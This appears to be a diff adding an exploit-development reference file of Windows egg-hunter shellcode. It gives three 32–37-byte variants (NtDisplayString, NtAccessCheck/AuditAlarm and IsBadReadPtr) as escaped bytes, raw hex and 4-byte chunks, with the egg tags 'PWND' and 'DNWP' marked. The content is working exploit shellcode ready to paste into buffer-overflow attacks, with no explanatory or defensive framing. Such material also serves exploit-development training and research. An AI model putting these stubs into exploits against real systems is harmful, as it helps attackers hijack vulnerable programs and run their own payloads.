@@ -1,0 +1,65 @@
+
+###
+# NTDisplayString - 32 Bytes
+# PWND = \x50\x57\x4e\x44   - search for PWNDPWND
+# DNWP = \x44\x4e\x57\x50   - search for DNWPDNWP
+###
+\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2e\x3C\x05\x5A\x74\xEF\xB8\x44\x4E\x57\x50\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7
+                                                                        ----------------
+                                                                              EGG
+6681CAFF0F42526A0258CD2e3C055A74EFB8444E57508BFAAF75EAAF75E7FFE7
+                                    --------
+                                      EGG
+\x66\x81\xCA\xFF
+\x0F\x42\x52\x6A
+\x02\x58\xCD\x2E
+\x3C\x05\x5A\x74
+\xEF\xB8\x44\x4E
+\x57\x50\x8B\xFA
+\xAF\x75\xEA\xAF
+\x75\xE7\xFF\xE7
+
+
+###
+# NTAccessCheck / AuditAlarm(?) - 32 bytes
+# PWND = \x50\x57\x4e\x44   - search for PWNDPWND
+###
+"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x50\x57\x4e\x44\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+                                                                         ----------------
+                                                                               EGG
+6681CAFF0F42526A0258CD2E3C055A74EFB850574E448BFAAF75EAAF75E7FFE7"
+                                    --------
+                                      EGG
+\x66\x81\xCA\xFF
+\x0F\x42\x52\x6A
+\x02\x58\xCD\x2E
+\x3C\x05\x5A\x74
+\xEF\xB8\x50\x57
+\x4e\x44\x8B\xFA
+\xAF\x75\xEA\xAF
+\x75\xE7\xFF\xE7
+
+
+###
+# IsBadReadPtr - 37 Bytes
+# PWND = \x50\x57\x4e\x44   - search for PWNDPWND
+###
+"\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8\x50\x57\x4e\x44\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
+                                                                        							----------------
+                                                                               							EGG
+33db6681cbff0f436a0853b80d5be777ffd085c075ecb850574e448bfbaf75e7af75e4ffe7
+  															 --------
+                                      				EGG
+\x33\xdb\x66\x81
+\xcb\xff\x0f\x43
+\x6a\x08\x53\xb8
+\x0d\x5b\xe7\x77
+\xff\xd0\x85\xc0
+\x75\xec\xb8\x50
+\x57\x4e\x44\x8b
+\xfb\xaf\x75\xe7
+\xaf\x75\xe4\xff
+\xe7
+
+
+
